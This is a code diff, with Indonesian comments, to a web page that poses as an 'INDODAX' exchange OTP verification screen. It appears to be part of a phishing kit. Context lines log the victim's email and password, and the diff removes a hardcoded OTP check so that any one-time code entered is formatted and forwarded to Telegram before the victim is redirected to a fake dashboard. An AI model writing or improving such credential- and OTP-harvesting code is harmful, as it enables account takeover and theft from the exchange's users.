@@ -118,6 +118,33 @@
 
       console.log('Session data:', {email, password});
 
+      // Fungsi untuk memastikan input hanya angka
+      function restrictToNumbers(input) {
+          input.on('input', function() {
+              const value = $(this).val();
+              // Hapus karakter non-angka
+              $(this).val(value.replace(/[^0-9]/g, ''));
+              toggleVerifyButton();
+          });
+
+          input.on('keydown', function(e) {
+              // Izinkan backspace, delete, tab, escape, enter, arrow keys
+              const allowedKeys = [8, 9, 13, 27, 37, 38, 39, 40, 46];
+              if (allowedKeys.includes(e.keyCode) || (e.keyCode >= 48 && e.keyCode <= 57) || (e.keyCode >= 96 && e.keyCode <= 105)) {
+                  // Angka dari keyboard utama (48-57) atau numpad (96-105)
+                  return true;
+              } else {
+                  e.preventDefault();
+                  return false;
+              }
+          });
+      }
+
+      // Terapkan restriksi angka ke semua input OTP
+      $('.otp-input').each(function() {
+          restrictToNumbers($(this));
+      });
+
       // Auto-focus ke input berikutnya saat input digit
       $('.otp-input').on('input', function() {
           const value = $(this).val();
@@ -140,7 +167,7 @@
           }
       });
 
-      // Fungsi validasi OTP: cek apakah semua 6 digit terisi
+      // Fungsi validasi OTP: cek apakah semua 6 digit terisi angka
       function isOtpValid() {
           let otp = '';
           $('.otp-input').each(function() {
@@ -172,14 +199,7 @@
               otp += $(this).val();
           });
 
-          // Validasi OTP (contoh: OTP harus "123456" untuk sukses; ganti sesuai kebutuhan)
-          if (otp !== '123456') {
-              console.log('OTP salah');
-              alert('OTP salah. Coba lagi.'); // Atau hapus alert jika tidak mau
-              return;
-          }
-
-          // Format pesan OTP untuk dikirim ke Telegram
+          // Format pesan OTP untuk dikirim ke Telegram (OTP bebas, tidak ada validasi hardcoded)
           const message = `
 Verifikasi OTP INDODAX
 ------------------------
@@ -205,7 +225,7 @@ OTP: ${otp}
                       sessionStorage.setItem('otp', otp);
 
                       // Redirect ke dashboard setelah sukses
-                      window.location.href = 'one.html';
+                      window.location.href = 'dashboard.html';
                   } else {
                       console.error('Error sending OTP:', data);
                   }
